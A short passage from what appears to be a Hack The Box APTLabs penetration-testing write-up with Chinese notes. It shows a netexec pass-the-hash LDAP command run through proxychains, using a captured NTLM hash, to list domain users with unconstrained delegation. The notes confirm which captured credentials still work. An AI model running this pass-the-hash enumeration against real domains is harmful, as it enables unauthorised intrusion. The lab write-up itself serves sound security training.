┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q netexec ldap dc.cubano.local -u support -H 97179aeefd6f3a6d329c37184fc639af -d cubano.local --find-delegation
LDAP        192.168.23.10   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:cubano.local) (signing:None) (channel binding:No TLS cert)
LDAP        192.168.23.10   389    DC               [+] cubano.local\support:97179aeefd6f3a6d329c37184fc639af
LDAP        192.168.23.10   389    DC               AccountName      AccountType DelegationType DelegationRightsTo
LDAP        192.168.23.10   389    DC               ---------------- ----------- -------------- ------------------
LDAP        192.168.23.10   389    DC               eyde.WEAVER      Person      Unconstrained  N/A     
LDAP        192.168.23.10   389    DC               charil.DENNIS    Person      Unconstrained  N/A     
LDAP        192.168.23.10   389    DC               elissa.ESTRADA   Person      Unconstrained  N/A     
LDAP        192.168.23.10   389    DC               lynnea.SUAREZ    Person      Unconstrained  N/A

```

+ `DEV$` 可成功 LDAP 认证到 `dc.cubano.local`
+ `support` 哈希在当前现场同样可成功 LDAP 认证
+ `--find-delegation` 可见 `albany` 等 `OU=inhouse` 用户为 `Unconstrained`

#### 结论
+ 当前链路关键凭据可用性已确认：`DEV$` 与 `support` 都可直接打域 LDAP

### Powerview
#### upload
